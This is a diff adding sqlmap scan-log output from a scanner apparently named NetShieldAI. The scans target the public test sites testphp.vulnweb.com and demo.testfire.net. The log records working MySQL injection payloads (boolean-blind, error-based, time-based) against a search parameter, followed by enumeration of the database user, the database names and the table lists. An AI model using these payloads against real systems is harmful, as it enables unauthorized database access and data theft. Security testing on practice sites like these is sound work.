@@ -573,3 +573,374 @@
 [2026-01-07 16:31:40] [SQLMap] |_ -| . [,]     | .'| . |
 [2026-01-07 16:31:40] [SQLMap] |___|_  [,]_|_|_|__,|  _|
 [2026-01-07 16:31:40] [SQLMap] |_|V...       |_|   https://sqlmap.org
+[2026-01-08 13:42:42] [*] Starting FULL SQL scan for http://testphp.vulnweb.com/artists.php?artist=1 (User: DivyaViradiya_1)...
+[2026-01-08 13:42:42] [*] Starting FULL scan (Detection + Enumeration) on http://testphp.vulnweb.com/artists.php?artist=1
+[2026-01-08 13:42:42] [*] Executing SQLMap...
+[2026-01-08 13:42:47] [SQLMap] ___
+[2026-01-08 13:42:47] [SQLMap] __H__
+[2026-01-08 13:42:47] [SQLMap] ___ ___[.]_____ ___ ___  {1.10.1.12#dev}
+[2026-01-08 13:42:47] [SQLMap] |_ -| . [.]     | .'| . |
+[2026-01-08 13:42:47] [SQLMap] |___|_  [,]_|_|_|__,|  _|
+[2026-01-08 13:42:47] [SQLMap] |_|V...       |_|   https://sqlmap.org
+[2026-01-08 13:43:49] [*] Starting FULL SQL scan for http://testphp.vulnweb.com/artists.php?artist=1 (User: DivyaViradiya_1)...
+[2026-01-08 13:43:49] [*] Starting FULL scan (Detection + Enumeration) on http://testphp.vulnweb.com/artists.php?artist=1
+[2026-01-08 13:43:49] [*] Executing SQLMap...
+[2026-01-08 13:43:50] [SQLMap] ___
+[2026-01-08 13:43:50] [SQLMap] __H__
+[2026-01-08 13:43:50] [SQLMap] ___ ___[(]_____ ___ ___  {1.10.1.12#dev}
+[2026-01-08 13:43:50] [SQLMap] |_ -| . [,]     | .'| . |
+[2026-01-08 13:43:50] [SQLMap] |___|_  [(]_|_|_|__,|  _|
+[2026-01-08 13:43:50] [SQLMap] |_|V...       |_|   https://sqlmap.org
+[2026-01-08 13:43:50] [SQLMap] [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+[2026-01-08 13:43:50] [SQLMap] [*] starting @ 13:43:50 /2026-01-08/
+[2026-01-08 13:43:50] [SQLMap] [13:43:50] [WARNING] using 'D:\NetShieldAI\Services\results\DivyaViradiya_1\sql_scanner' as the output directory
+[2026-01-08 13:43:50] [DATA] [13:43:50] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.7204.93 Safari/537.36' from file 'D:\SQLmap_setup\data\txt\user-agents.txt'
+[2026-01-08 13:43:50] [SQLMap] do you want to check for the existence of site's sitemap(.xml) [y/N] N
+[2026-01-08 13:43:50] [SQLMap] [13:43:50] [INFO] starting crawler for target URL 'http://testphp.vulnweb.com/artists.php?artist=1'
+[2026-01-08 13:43:50] [SQLMap] [13:43:50] [INFO] searching for links with depth 1
+[2026-01-08 13:43:50] [SQLMap] [13:43:50] [INFO] starting 2 threads
+[2026-01-08 13:43:51] [SQLMap] [13:43:51] [INFO] searching for links with depth 2
+[2026-01-08 13:43:51] [SQLMap] [13:43:51] [INFO] starting 3 threads
+[2026-01-08 13:43:51] [SQLMap] do you want to normalize crawling results [Y/n] Y
+[2026-01-08 13:43:51] [SQLMap] do you want to store crawling results to a temporary file for eventual further processing with other tools [y/N] N
+[2026-01-08 13:43:58] [SQLMap] [13:43:58] [INFO] found a total of 3 targets
+[2026-01-08 13:43:58] [SQLMap] [1/3] Form:
+[2026-01-08 13:43:58] [SQLMap] POST http://testphp.vulnweb.com/search.php?test=query
+[2026-01-08 13:43:58] [SQLMap] POST data: searchFor=&goButton=go
+[2026-01-08 13:43:58] [SQLMap] do you want to test this form? [Y/n/q]
+[2026-01-08 13:43:58] [SQLMap] > Y
+[2026-01-08 13:43:58] [SQLMap] Edit POST data [default: searchFor=&goButton=go] (Warning: blank fields detected): searchFor=&goButton=go
+[2026-01-08 13:43:58] [SQLMap] do you want to fill blank fields with random values? [Y/n] Y
+[2026-01-08 13:43:58] [SQLMap] [13:43:58] [INFO] resuming back-end DBMS 'mysql'
+[2026-01-08 13:43:58] [SQLMap] [13:43:58] [INFO] using 'D:\NetShieldAI\Services\results\DivyaViradiya_1\sql_scanner\results-01082026_0143pm.csv' as the CSV results file in multiple targets mode
+[2026-01-08 13:43:58] [SQLMap] sqlmap resumed the following injection point(s) from stored session:
+[2026-01-08 13:43:58] [SQLMap] ---
+[2026-01-08 13:43:58] [SQLMap] Parameter: searchFor (POST)
+[2026-01-08 13:43:58] [SQLMap] Type: boolean-based blind
+[2026-01-08 13:43:58] [SQLMap] Title: MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
+[2026-01-08 13:43:58] [SQLMap] Payload: searchFor=Ukxa' AND EXTRACTVALUE(7498,CASE WHEN (7498=7498) THEN 7498 ELSE 0x3A END) AND 'VeRE'='VeRE&goButton=go
+[2026-01-08 13:43:58] [SQLMap] Type: error-based
+[2026-01-08 13:43:58] [SQLMap] Title: MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)
+[2026-01-08 13:43:58] [SQLMap] Payload: searchFor=Ukxa' OR GTID_SUBSET(CONCAT(0x7171786b71,(SELECT (ELT(1342=1342,1))),0x716a6b7a71),1342) AND 'sSGK'='sSGK&goButton=go
+[2026-01-08 13:43:58] [SQLMap] Type: time-based blind
+[2026-01-08 13:43:58] [SQLMap] Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+[2026-01-08 13:43:58] [SQLMap] Payload: searchFor=Ukxa' AND (SELECT 4834 FROM (SELECT(SLEEP(5)))TXdc) AND 'HiXS'='HiXS&goButton=go
+[2026-01-08 13:43:58] [SQLMap] ---
+[2026-01-08 13:43:58] [SQLMap] do you want to exploit this SQL injection? [Y/n] Y
+[2026-01-08 13:43:58] [SQLMap] [13:43:58] [INFO] the back-end DBMS is MySQL
+[2026-01-08 13:43:58] [SQLMap] [13:43:58] [INFO] fetching banner
+[2026-01-08 13:43:58] [SQLMap] [13:43:58] [INFO] resumed: '8.0.22-0ubuntu0.20.04.2'
+[2026-01-08 13:43:58] [SQLMap] web server operating system: Linux Ubuntu
+[2026-01-08 13:43:58] [SQLMap] web application technology: PHP 5.6.40, Nginx 1.19.0
+[2026-01-08 13:43:58] [SQLMap] back-end DBMS operating system: Linux Ubuntu
+[2026-01-08 13:43:58] [SQLMap] back-end DBMS: MySQL >= 5.6
+[2026-01-08 13:43:58] [SQLMap] banner: '8.0.22-0ubuntu0.20.04.2'
+[2026-01-08 13:43:58] [SQLMap] [13:43:58] [INFO] fetching current user
+[2026-01-08 13:43:58] [SQLMap] [13:43:58] [INFO] resumed: 'acuart@localhost'
+[2026-01-08 13:43:58] [SQLMap] current user: 'acuart@localhost'
+[2026-01-08 13:43:58] [SQLMap] [13:43:58] [INFO] fetching current database
+[2026-01-08 13:43:58] [SQLMap] [13:43:58] [INFO] resumed: 'acuart'
+[2026-01-08 13:43:58] [SQLMap] current database: 'acuart'
+[2026-01-08 13:43:58] [SQLMap] [13:43:58] [INFO] testing if current user is DBA
+[2026-01-08 13:43:58] [SQLMap] [13:43:58] [INFO] fetching current user
+[2026-01-08 13:43:59] [SQLMap] [13:43:59] [WARNING] reflective value(s) found and filtering out
+[2026-01-08 13:43:59] [SQLMap] [13:43:59] [WARNING] potential permission problems detected ('command denied')
+[2026-01-08 13:43:59] [SQLMap] [13:43:59] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
+[2026-01-08 13:43:59] [SQLMap] current user is DBA: False
+[2026-01-08 13:43:59] [SQLMap] [13:43:59] [INFO] fetching database users password hashes
+[2026-01-08 13:43:59] [SQLMap] [13:43:59] [WARNING] the SQL query provided does not return any output
+[2026-01-08 13:43:59] [SQLMap] [13:43:59] [WARNING] the SQL query provided does not return any output
+[2026-01-08 13:43:59] [SQLMap] [13:43:59] [INFO] fetching database users
+[2026-01-08 13:43:59] [SQLMap] [13:43:59] [INFO] resumed: ''acuart'@'localhost''
+[2026-01-08 13:43:59] [SQLMap] [13:43:59] [INFO] fetching number of password hashes for user 'acuart'
+[2026-01-08 13:44:00] [SQLMap] [13:43:59] [INFO] retrieved:
+[2026-01-08 13:44:00] [SQLMap] multi-threading is considered unsafe in time-based data retrieval. Are you sure of your choice (breaking warranty) [y/N] N
+[2026-01-08 13:44:10] [SQLMap] [13:44:00] [INFO] retrieved: [13:44:00] [WARNING] time-based comparison requires larger statistical model, please wait........................ (done)
+[2026-01-08 13:44:11] [SQLMap] [13:44:11] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions
+[2026-01-08 13:44:13] [SQLMap] [13:44:12] [INFO] retrieved:
+[2026-01-08 13:44:14] [SQLMap] [13:44:13] [INFO] retrieved:
+[2026-01-08 13:44:14] [SQLMap] [13:44:14] [WARNING] unable to retrieve the number of password hashes for user 'acuart'
+[2026-01-08 13:44:14] [SQLMap] [13:44:14] [ERROR] unable to retrieve the password hashes for the database users
+[2026-01-08 13:44:14] [SQLMap] [13:44:14] [INFO] fetching database names
+[2026-01-08 13:44:14] [SQLMap] [13:44:14] [INFO] starting 2 threads
+[2026-01-08 13:44:14] [SQLMap] [13:44:14] [INFO] resumed: 'information_schema'
+[2026-01-08 13:44:14] [SQLMap] [13:44:14] [INFO] resumed: 'acuart'
+[2026-01-08 13:44:14] [SQLMap] available databases [2]:
+[2026-01-08 13:44:14] [SQLMap] [*] acuart
+[2026-01-08 13:44:14] [SQLMap] [*] information_schema
+[2026-01-08 13:44:14] [SQLMap] [13:44:14] [INFO] fetching tables for databases: 'acuart, information_schema'
+[2026-01-08 13:44:14] [SQLMap] [13:44:14] [INFO] starting 10 threads
+[2026-01-08 13:44:14] [SQLMap] Database: acuart
+[2026-01-08 13:44:14] [SQLMap] [8 tables]
+[2026-01-08 13:44:14] [SQLMap] +---------------------------------------+
+[2026-01-08 13:44:14] [SQLMap] | artists                               |
+[2026-01-08 13:44:14] [SQLMap] | carts                                 |
+[2026-01-08 13:44:14] [SQLMap] | categ                                 |
+[2026-01-08 13:44:14] [SQLMap] | featured                              |
+[2026-01-08 13:44:14] [SQLMap] | guestbook                             |
+[2026-01-08 13:44:14] [SQLMap] | pictures                              |
+[2026-01-08 13:44:14] [SQLMap] | products                              |
+[2026-01-08 13:44:14] [SQLMap] | users                                 |
+[2026-01-08 13:44:14] [SQLMap] +---------------------------------------+
+[2026-01-08 13:44:14] [SQLMap] Database: information_schema
+[2026-01-08 13:44:14] [SQLMap] [79 tables]
+[2026-01-08 13:44:14] [SQLMap] +---------------------------------------+
+[2026-01-08 13:44:14] [SQLMap] | ADMINISTRABLE_ROLE_AUTHORIZATIONS     |
+[2026-01-08 13:44:14] [SQLMap] | APPLICABLE_ROLES                      |
+[2026-01-08 13:44:14] [SQLMap] | CHARACTER_SETS                        |
+[2026-01-08 13:44:14] [SQLMap] | CHECK_CONSTRAINTS                     |
+[2026-01-08 13:44:14] [SQLMap] | COLLATIONS                            |
+[2026-01-08 13:44:14] [SQLMap] | COLLATION_CHARACTER_SET_APPLICABILITY |
+[2026-01-08 13:44:14] [SQLMap] | COLUMNS_EXTENSIONS                    |
+[2026-01-08 13:44:14] [SQLMap] | COLUMN_PRIVILEGES                     |
+[2026-01-08 13:44:14] [SQLMap] | COLUMN_STATISTICS                     |
+[2026-01-08 13:44:14] [SQLMap] | ENABLED_ROLES                         |
+[2026-01-08 13:44:14] [SQLMap] | FILES                                 |
+[2026-01-08 13:44:14] [SQLMap] | INNODB_BUFFER_PAGE                    |
+[2026-01-08 13:44:14] [SQLMap] | INNODB_BUFFER_PAGE_LRU                |
+[2026-01-08 13:44:14] [SQLMap] | INNODB_BUFFER_POOL_STATS              |
+[2026-01-08 13:44:14] [SQLMap] | INNODB_CACHED_INDEXES                 |
+[2026-01-08 13:44:14] [SQLMap] | INNODB_CMP                            |
+[2026-01-08 13:44:14] [SQLMap] | INNODB_CMPMEM                         |
+[2026-01-08 13:44:14] [SQLMap] | INNODB_CMPMEM_RESET                   |
+[2026-01-08 13:44:14] [SQLMap] | INNODB_CMP_PER_INDEX                  |
+[2026-01-08 13:44:14] [SQLMap] | INNODB_CMP_PER_INDEX_RESET            |
+[2026-01-08 13:44:14] [SQLMap] | INNODB_CMP_RESET                      |
+[2026-01-08 13:44:14] [SQLMap] | INNODB_COLUMNS                        |
+[2026-01-08 13:44:14] [SQLMap] | INNODB_DATAFILES                      |
+[2026-01-08 13:44:14] [SQLMap] | INNODB_FIELDS                         |
+[2026-01-08 13:44:14] [SQLMap] | INNODB_FOREIGN                        |
+[2026-01-08 13:44:14] [SQLMap] | INNODB_FOREIGN_COLS                   |
+[2026-01-08 13:44:14] [SQLMap] | INNODB_FT_BEING_DELETED               |
+[2026-01-08 13:44:14] [SQLMap] | INNODB_FT_CONFIG                      |
+[2026-01-08 13:44:14] [SQLMap] | INNODB_FT_DEFAULT_STOPWORD            |
+[2026-01-08 13:44:14] [SQLMap] | INNODB_FT_DELETED                     |
+[2026-01-08 13:44:14] [SQLMap] | INNODB_FT_INDEX_CACHE                 |
+[2026-01-08 13:44:14] [SQLMap] | INNODB_FT_INDEX_TABLE                 |
+[2026-01-08 13:44:14] [SQLMap] | INNODB_INDEXES                        |
+[2026-01-08 13:44:14] [SQLMap] | INNODB_METRICS                        |
+[2026-01-08 13:44:14] [SQLMap] | INNODB_SESSION_TEMP_TABLESPACES       |
+[2026-01-08 13:44:14] [SQLMap] | INNODB_TABLES                         |
+[2026-01-08 13:44:14] [SQLMap] | INNODB_TABLESPACES                    |
+[2026-01-08 13:44:14] [SQLMap] | INNODB_TABLESPACES_BRIEF              |
+[2026-01-08 13:44:14] [SQLMap] | INNODB_TABLESTATS                     |
+[2026-01-08 13:44:14] [SQLMap] | INNODB_TEMP_TABLE_INFO                |
+[2026-01-08 13:44:14] [SQLMap] | INNODB_TRX                            |
+[2026-01-08 13:44:14] [SQLMap] | INNODB_VIRTUAL                        |
+[2026-01-08 13:44:14] [SQLMap] | KEYWORDS                              |
+[2026-01-08 13:44:14] [SQLMap] | KEY_COLUMN_USAGE                      |
+[2026-01-08 13:44:14] [SQLMap] | OPTIMIZER_TRACE                       |
+[2026-01-08 13:44:14] [SQLMap] | PARAMETERS                            |
+[2026-01-08 13:44:14] [SQLMap] | PROFILING                             |
+[2026-01-08 13:44:14] [SQLMap] | REFERENTIAL_CONSTRAINTS               |
+[2026-01-08 13:44:14] [SQLMap] | RESOURCE_GROUPS                       |
+[2026-01-08 13:44:14] [SQLMap] | ROLE_COLUMN_GRANTS                    |
+[2026-01-08 13:44:14] [SQLMap] | ROLE_ROUTINE_GRANTS                   |
+[2026-01-08 13:44:14] [SQLMap] | ROLE_TABLE_GRANTS                     |
+[2026-01-08 13:44:14] [SQLMap] | ROUTINES                              |
+[2026-01-08 13:44:14] [SQLMap] | SCHEMATA                              |
+[2026-01-08 13:44:14] [SQLMap] | SCHEMATA_EXTENSIONS                   |
+[2026-01-08 13:44:14] [SQLMap] | SCHEMA_PRIVILEGES                     |
+[2026-01-08 13:44:14] [SQLMap] | STATISTICS                            |
+[2026-01-08 13:44:14] [SQLMap] | ST_GEOMETRY_COLUMNS                   |
+[2026-01-08 13:44:14] [SQLMap] | ST_SPATIAL_REFERENCE_SYSTEMS          |
+[2026-01-08 13:44:14] [SQLMap] | ST_UNITS_OF_MEASURE                   |
+[2026-01-08 13:44:14] [SQLMap] | TABLESPACES                           |
+[2026-01-08 13:44:14] [SQLMap] | TABLESPACES_EXTENSIONS                |
+[2026-01-08 13:44:14] [SQLMap] | TABLES_EXTENSIONS                     |
+[2026-01-08 13:44:14] [SQLMap] | TABLE_CONSTRAINTS                     |
+[2026-01-08 13:44:14] [SQLMap] | TABLE_CONSTRAINTS_EXTENSIONS          |
+[2026-01-08 13:44:14] [SQLMap] | TABLE_PRIVILEGES                      |
+[2026-01-08 13:44:14] [SQLMap] | USER_ATTRIBUTES                       |
+[2026-01-08 13:44:14] [SQLMap] | USER_PRIVILEGES                       |
+[2026-01-08 13:44:14] [SQLMap] | VIEWS                                 |
+[2026-01-08 13:44:14] [SQLMap] | VIEW_ROUTINE_USAGE                    |
+[2026-01-08 13:44:14] [SQLMap] | VIEW_TABLE_USAGE                      |
+[2026-01-08 13:44:14] [SQLMap] | COLUMNS                               |
+[2026-01-08 13:44:14] [SQLMap] | ENGINES                               |
+[2026-01-08 13:44:14] [SQLMap] | EVENTS                                |
+[2026-01-08 13:44:14] [SQLMap] | PARTITIONS                            |
+[2026-01-08 13:44:14] [SQLMap] | PLUGINS                               |
+[2026-01-08 13:44:14] [SQLMap] | PROCESSLIST                           |
+[2026-01-08 13:44:14] [SQLMap] | TABLES                                |
+[2026-01-08 13:44:14] [SQLMap] | TRIGGERS                              |
+[2026-01-08 13:44:14] [SQLMap] +---------------------------------------+
+[2026-01-08 13:44:14] [SQLMap] SQL injection vulnerability has already been detected against 'testphp.vulnweb.com'. Do you want to skip further tests involving it? [Y/n] Y
+[2026-01-08 13:44:14] [SQLMap] [13:44:14] [INFO] skipping 'http://testphp.vulnweb.com/artists.php?artist=1'
+[2026-01-08 13:44:14] [SQLMap] [13:44:14] [INFO] skipping 'http://testphp.vulnweb.com/hpp/?pp=12'
+[2026-01-08 13:44:14] [SQLMap] [13:44:14] [INFO] you can find results of scanning in multiple targets mode inside the CSV file 'D:\NetShieldAI\Services\results\DivyaViradiya_1\sql_scanner\results-01082026_0143pm.csv'
+[2026-01-08 13:44:14] [+] Scan Completed. Parsing results...
+[2026-01-08 13:44:14] [+] Parsed 10 vulnerabilities from log.
+[2026-01-08 13:44:14] [+] SQL JSON report saved to D:\NetShieldAI\Services\results\DivyaViradiya_1\sql_scanner\sql_report.json
+[2026-01-08 13:44:14] [+] SQL scan complete. Generating PDF report...
+[2026-01-08 13:44:14] [+] PDF report generated successfully: D:\NetShieldAI\Services\results\DivyaViradiya_1\sql_scanner\sql_report.pdf
+[2026-01-09 20:00:48] [*] Starting QUICK SQL scan for https://demo.testfire.net/search.jsp (User: DivyaViradiya_1)...
+[2026-01-09 20:00:48] [*] Starting QUICK scan (Detection) on https://demo.testfire.net/search.jsp
+[2026-01-09 20:00:48] [*] Executing SQLMap...
+[2026-01-09 20:00:56] [SQLMap] ___
+[2026-01-09 20:00:56] [SQLMap] __H__
+[2026-01-09 20:00:56] [SQLMap] ___ ___[)]_____ ___ ___  {1.10.1.12#dev}
+[2026-01-09 20:00:56] [SQLMap] |_ -| . ["]     | .'| . |
+[2026-01-09 20:00:56] [SQLMap] |___|_  ["]_|_|_|__,|  _|
+[2026-01-09 20:00:56] [SQLMap] |_|V...       |_|   https://sqlmap.org
+[2026-01-09 20:00:56] [SQLMap] [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+[2026-01-09 20:00:56] [SQLMap] [*] starting @ 20:00:56 /2026-01-09/
+[2026-01-09 20:00:56] [SQLMap] [20:00:56] [WARNING] using 'D:\NetShieldAI\Services\results\DivyaViradiya_1\sql_scanner' as the output directory
+[2026-01-09 20:00:56] [DATA] [20:00:56] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edg/135.0.0.0' from file 'D:\SQLmap_setup\data\txt\user-agents.txt'
+[2026-01-09 20:00:56] [SQLMap] do you want to check for the existence of site's sitemap(.xml) [y/N] N
+[2026-01-09 20:00:56] [SQLMap] [20:00:56] [INFO] starting crawler for target URL 'https://demo.testfire.net/search.jsp'
+[2026-01-09 20:00:56] [SQLMap] [20:00:56] [INFO] searching for links with depth 1
+[2026-01-09 20:00:56] [SQLMap] [20:00:56] [INFO] starting 2 threads
+[2026-01-09 20:00:58] [SQLMap] [20:00:58] [INFO] searching for links with depth 2
+[2026-01-09 20:00:58] [SQLMap] [20:00:58] [INFO] starting 10 threads
+[2026-01-09 20:01:02] [SQLMap] do you want to normalize crawling results [Y/n] Y
+[2026-01-09 20:01:02] [SQLMap] do you want to store crawling results to a temporary file for eventual further processing with other tools [y/N] N
+[2026-01-09 20:01:08] [SQLMap] [20:01:08] [INFO] found a total of 9 targets
+[2026-01-09 20:01:08] [SQLMap] [1/9] Form:
+[2026-01-09 20:01:08] [SQLMap] GET https://demo.testfire.net/search.jsp?query=
+[2026-01-09 20:01:08] [SQLMap] do you want to test this form? [Y/n/q]
+[2026-01-09 20:01:08] [SQLMap] > Y
+[2026-01-09 20:01:08] [SQLMap] Edit GET data [default: query=]: query=
+[2026-01-09 20:01:08] [SQLMap] do you want to fill blank fields with random values? [Y/n] Y
+[2026-01-09 20:01:08] [SQLMap] [20:01:08] [INFO] using 'D:\NetShieldAI\Services\results\DivyaViradiya_1\sql_scanner\results-01092026_0801pm.csv' as the CSV results file in multiple targets mode
+[2026-01-09 20:01:09] [SQLMap] you have not declared cookie(s), while server wants to set its own ('JSESSIONID=568E226D47E...938E7C3D52'). Do you want to use those [Y/n] Y
+[2026-01-09 20:01:09] [SQLMap] [20:01:09] [INFO] checking if the target is protected by some kind of WAF/IPS
+[2026-01-09 20:01:10] [SQLMap] [20:01:10] [INFO] testing if the target URL content is stable
+[2026-01-09 20:01:11] [SQLMap] [20:01:11] [INFO] target URL content is stable
+[2026-01-09 20:01:11] [SQLMap] [20:01:11] [INFO] testing if GET parameter 'query' is dynamic
+[2026-01-09 20:01:12] [SQLMap] [20:01:12] [WARNING] GET parameter 'query' does not appear to be dynamic
+[2026-01-09 20:01:13] [SQLMap] [20:01:13] [WARNING] heuristic (basic) test shows that GET parameter 'query' might not be injectable
+[2026-01-09 20:01:14] [DATA] [20:01:14] [INFO] heuristic (XSS) test shows that GET parameter 'query' might be vulnerable to cross-site scripting (XSS) attacks
+[2026-01-09 20:01:14] [SQLMap] [20:01:14] [INFO] testing for SQL injection on GET parameter 'query'
+[2026-01-09 20:01:14] [SQLMap] [20:01:14] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[2026-01-09 20:01:15] [SQLMap] [20:01:15] [WARNING] reflective value(s) found and filtering out
+[2026-01-09 20:01:23] [SQLMap] [20:01:23] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[2026-01-09 20:01:24] [SQLMap] [20:01:24] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[2026-01-09 20:01:29] [SQLMap] [20:01:29] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[2026-01-09 20:01:33] [SQLMap] [20:01:33] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
+[2026-01-09 20:01:37] [SQLMap] [20:01:37] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+[2026-01-09 20:01:41] [SQLMap] [20:01:41] [INFO] testing 'Generic inline queries'
+[2026-01-09 20:01:42] [SQLMap] [20:01:42] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[2026-01-09 20:01:45] [SQLMap] [20:01:45] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
+[2026-01-09 20:01:48] [SQLMap] [20:01:48] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
+[2026-01-09 20:01:52] [SQLMap] [20:01:52] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[2026-01-09 20:01:56] [SQLMap] [20:01:56] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+[2026-01-09 20:02:00] [SQLMap] [20:02:00] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
+[2026-01-09 20:02:04] [SQLMap] [20:02:04] [INFO] testing 'Oracle AND time-based blind'
+[2026-01-09 20:02:08] [SQLMap] it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
+[2026-01-09 20:02:08] [SQLMap] [20:02:08] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+[2026-01-09 20:02:17] [SQLMap] [20:02:17] [WARNING] GET parameter 'query' does not seem to be injectable
+[2026-01-09 20:02:17] [SQLMap] [20:02:17] [ERROR] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment'), skipping to the next target
+[2026-01-09 20:02:17] [SQLMap] [2/9] Form:
+[2026-01-09 20:02:17] [SQLMap] POST https://demo.testfire.net/doSubscribe
+[2026-01-09 20:02:17] [SQLMap] POST data: txtEmail=&btnSubmit=Subscribe
+[2026-01-09 20:02:17] [SQLMap] do you want to test this form? [Y/n/q]
+[2026-01-09 20:02:17] [SQLMap] > Y
+[2026-01-09 20:02:17] [SQLMap] Edit POST data [default: txtEmail=&btnSubmit=Subscribe] (Warning: blank fields detected): txtEmail=&btnSubmit=Subscribe
+[2026-01-09 20:02:17] [SQLMap] do you want to fill blank fields with random values? [Y/n] Y
+[2026-01-09 20:02:18] [SQLMap] got a 302 redirect to 'https://demo.testfire.net/index.jsp'. Do you want to follow? [Y/n] Y
+[2026-01-09 20:02:18] [SQLMap] redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
+[2026-01-09 20:02:19] [SQLMap] you have not declared cookie(s), while server wants to set its own ('JSESSIONID=E956DD737D0...9E6CAE5A71'). Do you want to use those [Y/n] Y
+[2026-01-09 20:02:19] [SQLMap] [20:02:19] [INFO] checking if the target is protected by some kind of WAF/IPS
+[2026-01-09 20:02:22] [SQLMap] [20:02:22] [INFO] testing if the target URL content is stable
+[2026-01-09 20:02:24] [SQLMap] [20:02:24] [WARNING] POST parameter 'txtEmail' does not appear to be dynamic
+[2026-01-09 20:02:26] [SQLMap] [20:02:26] [WARNING] heuristic (basic) test shows that POST parameter 'txtEmail' might not be injectable
+[2026-01-09 20:02:29] [SQLMap] [20:02:29] [INFO] testing for SQL injection on POST parameter 'txtEmail'
+[2026-01-09 20:02:29] [SQLMap] [20:02:29] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[2026-01-09 20:02:41] [SQLMap] [20:02:41] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[2026-01-09 20:02:43] [SQLMap] [20:02:43] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[2026-01-09 20:02:55] [SQLMap] [20:02:55] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[2026-01-09 20:03:06] [SQLMap] [20:03:06] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
+[2026-01-09 20:03:18] [SQLMap] [20:03:18] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+[2026-01-09 20:03:29] [SQLMap] [20:03:29] [INFO] testing 'Generic inline queries'
+[2026-01-09 20:03:32] [SQLMap] [20:03:32] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[2026-01-09 20:03:34] [SQLMap] [20:03:32] [WARNING] time-based comparison requires larger statistical model, please wait. (done)
+[2026-01-09 20:03:43] [SQLMap] [20:03:43] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
+[2026-01-09 20:03:52] [SQLMap] [20:03:52] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
+[2026-01-09 20:04:02] [SQLMap] [20:04:02] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[2026-01-09 20:04:13] [SQLMap] [20:04:13] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+[2026-01-09 20:04:25] [SQLMap] [20:04:25] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
+[2026-01-09 20:04:36] [SQLMap] [20:04:36] [INFO] testing 'Oracle AND time-based blind'
+[2026-01-09 20:04:48] [SQLMap] it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
+[2026-01-09 20:04:48] [SQLMap] [20:04:48] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+[2026-01-09 20:05:10] [SQLMap] [20:05:10] [WARNING] POST parameter 'txtEmail' does not seem to be injectable
+[2026-01-09 20:05:10] [SQLMap] [20:05:10] [WARNING] POST parameter 'btnSubmit' does not appear to be dynamic
+[2026-01-09 20:05:13] [SQLMap] [20:05:13] [WARNING] heuristic (basic) test shows that POST parameter 'btnSubmit' might not be injectable
+[2026-01-09 20:05:15] [SQLMap] [20:05:15] [INFO] testing for SQL injection on POST parameter 'btnSubmit'
+[2026-01-09 20:05:15] [SQLMap] [20:05:15] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[2026-01-09 20:05:27] [SQLMap] [20:05:27] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[2026-01-09 20:05:29] [SQLMap] [20:05:29] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[2026-01-09 20:05:40] [SQLMap] [20:05:40] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[2026-01-09 20:05:52] [SQLMap] [20:05:52] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
